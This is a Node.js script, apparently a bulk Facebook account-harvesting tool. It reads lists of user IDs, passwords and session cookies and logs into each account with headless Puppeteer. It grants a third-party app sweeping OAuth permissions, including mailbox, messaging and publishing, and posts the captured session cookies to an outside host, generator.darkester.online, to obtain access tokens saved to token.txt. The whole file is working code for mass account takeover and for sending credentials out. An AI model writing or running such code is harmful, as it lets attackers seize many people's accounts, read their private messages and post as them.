const axios = require('axios');
const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer');

async function relogCokis(email, password, cookies) {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    // Parse cookies string to array of cookie objects
    const cookieArr = cookies.split(';').map(cookie => {
        const [name, ...rest] = cookie.trim().split('=');
        return {
            name,
            value: rest.join('='),
            domain: '.facebook.com',
            path: '/',
            httpOnly: false,
            secure: true
        };
    }).filter(c => (c.name === 'sb' || c.name === 'datr') && c.value);

    await page.browserContext().setCookie(...cookieArr);

    await page.goto('https://www.facebook.com/login', { waitUntil: 'networkidle2' });

    if (!email || !password) {
        throw new Error('Email and password must be provided via environment variables EMAIL and PASSWORD');
    }

    await page.waitForSelector('#email', { timeout: 10000 });
    await page.type('#email', email, { delay: 50 });
    await page.type('#pass', password, { delay: 50 });
    await Promise.all([
        page.click('button[name="login"], #loginbutton'),
        page.waitForNavigation({ waitUntil: 'networkidle2' })
    ]);
    await new Promise(r => setTimeout(r, 15000));

    const oauthUrl = 'https://web.facebook.com/dialog/oauth?scope=user_about_me,user_actions.books,user_actions.fitness,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_friends,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_managed_groups,user_photos,user_posts,user_relationship_details,user_relationships,user_religion_politics,user_status,user_tagged_places,user_videos,user_website,user_work_history,email,manage_notifications,manage_pages,pages_messaging,publish_actions,publish_pages,read_friendlists,read_insights,read_page_mailboxes,read_stream,rsvp_event,read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=https://www.instagram.com/';

    await page.goto(oauthUrl, { waitUntil: 'networkidle2' });

    // Click "Lanjutkan" button if present
    try {
        await page.waitForSelector('button[type="submit"], [name="__CONFIRM__"]', { timeout: 5000 });
        await page.click('button[type="submit"], [name="__CONFIRM__"]');
    } catch (e) {
        // Button not found, continue
    }

    // Wait for 5 seconds
    await new Promise(r => setTimeout(r, 5000));

    const newCookies = await page.browserContext().cookies();
    await browser.close();

    // Convert cookies array to string
    const cokisStr = newCookies.map(c => `${c.name}=${c.value}`).join('; ');
    //return cokisStr;
    const genResponse = await axios.post(
                "https://generator.darkester.online/",
                `cookie=${encodeURIComponent(cokisStr)}`,
                {
                    headers: {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "content-type": "application/x-www-form-urlencoded",
                    }
                }
            );
            const eaabMatch = genResponse.data.match(/(EAAB\w+)/);
            if (eaabMatch) {
                console.log('[✓] ', eaabMatch[1]);
                const tokenPath = path.join(__dirname, 'token.txt');
                try {
                    fs.writeFileSync(tokenPath, eaabMatch[1] + '\n', { flag: 'a' });
                    console.log(`[✓] ${tokenPath}`);
                } catch (writeErr) {
                    console.error(`[!] Failed to write token: ${writeErr.message}`);
                }
            } else {
                console.log('[!] token not found in response!');
            }
}

const searchToken = async (cookies) => {
    try {
        const genResponse = await axios.post(
                "https://generator.darkester.online/",
                `cookie=${encodeURIComponent(cookies)}`,
                {
                    headers: {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "content-type": "application/x-www-form-urlencoded",
                    }
                }
            );
            const eaabMatch = genResponse.data.match(/(EAAB\w+)/);
            if (eaabMatch) {
                console.log('[✓] ', eaabMatch[1]);
                const tokenPath = path.join(__dirname, 'token.txt');
                try {
                    fs.writeFileSync(tokenPath, eaabMatch[1] + '\n', { flag: 'a' });
                    console.log(`[✓] Token written to ${tokenPath}`);
                } catch (writeErr) {
                    console.error(`[!] Failed to write token: ${writeErr.message}`);
                }
            } else {
                console.log('[!] token not found in response!');
            }
    } catch (error) {
        if (error.response) {
            console.log('Status:', error.response.status);
            console.log('Headers:', error.response.headers);
            console.log('Data:', error.response.data);
        } else {
            console.error('Error:', error.message);
        }
    }
};

(async () => {
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    const cookiesFile = path.join(__dirname, 'cokis.txt');
    const credentialsListRaw = fs.readFileSync(cookiesFile, 'utf8')
        .split('\n')
        .map(line => line.trim())
        .filter(line => line.length > 0);

    // Extract sb, datr, c_user, xs, fr from each line
    const credentialsList = credentialsListRaw
        .map(line => {
            const [uid, password] = line.split('|');
            const sbMatch = line.match(/sb=([^;]+)/);
            const datrMatch = line.match(/datr=([^;]+)/);
            const cUserMatch = line.match(/c_user=([^;]+)/);
            const xsMatch = line.match(/xs=([^;]+)/);
            const frMatch = line.match(/fr=([^;]+)/);
            if (sbMatch && datrMatch) {
                return {
                    uid: uid ? uid.trim() : '',
                    password: password ? password.trim() : '',
                    sb: sbMatch[1],
                    datr: datrMatch[1],
                    c_user: cUserMatch ? cUserMatch[1] : '',
                    xs: xsMatch ? xsMatch[1] : '',
                    fr: frMatch ? frMatch[1] : ''
                };
            }
            return null;
        })
        .filter(Boolean);

    const concurrency = 5; // Set your desired concurrency
    let index = 0;

    const runBatch = async () => {
        while (index < credentialsList.length) {
            const batch = [];
            for (let i = 0; i < concurrency && index < credentialsList.length; i++, index++) {
                const { sb, datr, uid, password } = credentialsList[index];
                batch.push(
                    (async () => {
                        await delay(i * 2000);
                        try {
                            await relogCokis(uid, password, `sb=${sb}; datr=${datr};`);
                        } catch (err) {
                            console.error(`[!] Error for sb=${sb} datr=${datr}:`, err.message);
                        }
                    })()
                );
            }
            await Promise.all(batch);
        }
    };

    await runBatch();
})();
